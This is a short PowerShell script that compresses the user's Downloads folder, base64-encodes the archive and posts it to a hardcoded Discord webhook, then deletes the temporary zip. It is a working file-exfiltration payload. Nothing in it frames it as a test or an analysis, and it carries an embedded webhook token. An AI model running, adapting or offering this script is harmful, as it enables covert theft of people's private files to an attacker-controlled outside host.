# Define the target folder and output zip file
$targetFolder = "$env:USERPROFILE\Downloads" # Change this to the desired folder
$zipFile = "$env:TEMP\Files.zip" # Temporary zip file

# Compress the target folder into a zip archive
Compress-Archive -Path $targetFolder -DestinationPath $zipFile -Force

# Define the Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1334812652823642204/uhy1mRr1neECnYelQKTSUcqjqFgAIo0fbFBJKgvs_ak1HaxlkDvx5Oa7v_ZQzdXzT6qL" # Replace with your webhook URL

# Read the zip file as binary
$fileBytes = [System.IO.File]::ReadAllBytes($zipFile)
$fileBase64 = [System.Convert]::ToBase64String($fileBytes)

# Prepare the payload for Discord
$payload = @{
    content = "*File Archive:*"
    file    = $fileBase64
    username = "PowerShell Bot"
} | ConvertTo-Json

# Send the data to Discord
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"

# Clean up: Delete the temporary zip file
Remove-Item -Path $zipFile -Force